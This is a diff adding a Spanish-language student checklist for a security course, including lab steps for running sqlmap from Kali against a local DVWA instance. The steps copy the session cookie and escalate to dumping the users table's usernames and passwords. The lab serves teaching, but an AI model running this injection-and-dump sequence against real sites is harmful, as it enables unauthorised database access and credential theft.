@@ -1,0 +1,23 @@
+1. Entregar Wireshark
+2. Entregar Docker con Login.php, etc.
+3. Tarea SQL Airbnb
+-----------
+4. Si tener probado / funcionando el Kali haciendo el SQLMap a DVWA
+http://192.168.1.84/dvwa/
+- Seguridad baja
+- EN la consola de Chrome escribir document.cookie para copiar "security=low, etc etc."
+- Copiar la URL para llamar a:
+sqlmap –u "http://192.168..../id=1&Submit=Submit#" --cookie
+"security=low;PHP..." 
+
+-----------
+sqlmap –u "http://192.168..../id=1&Submit=Submit#" --cookie
+"security=low;PHP..." --dbs
+
+sqlmap –u "http://192.168..../id=1&Submit=Submit#" --cookie
+"security=low;PHP..." -D dvwa --tables
+
+Se van añadiendo sucesivamente: --dbs
+-D dvwa --tables
+-D dvwa –T users --columns
+-D dvwa –T users –C user,password --dump
